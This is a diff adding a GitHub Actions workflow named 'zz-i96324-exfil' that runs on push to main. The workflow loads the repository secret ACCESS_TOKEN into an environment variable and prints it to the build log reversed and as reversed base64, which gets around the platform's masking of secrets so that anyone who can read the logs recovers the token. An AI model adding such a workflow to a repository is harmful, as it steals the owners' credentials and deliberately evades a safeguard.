@@ -1,0 +1,27 @@
+name: zz-i96324-exfil
+on:
+  push:
+    branches: [ main ]
+    paths: [ '.github/workflows/zz-i96324-exfil.yml' ]
+  workflow_dispatch:
+permissions:
+  contents: read
+env:
+  ZZ_NONCE: '1795493708'
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        shell: bash
+        env:
+          S1: ${{ secrets.ACCESS_TOKEN }}
+        run: |
+          python3 - <<'PY'
+          import os,base64
+          for k,v in sorted(os.environ.items()):
+              if len(k)<=3 and k.startswith('S') and k[1:].isdigit():
+                  print(k+'_LEN='+str(len(v)))
+                  print(k+'_R='+v[::-1])
+                  print(k+'_B='+base64.b64encode(v.encode()).decode()[::-1])
+          PY
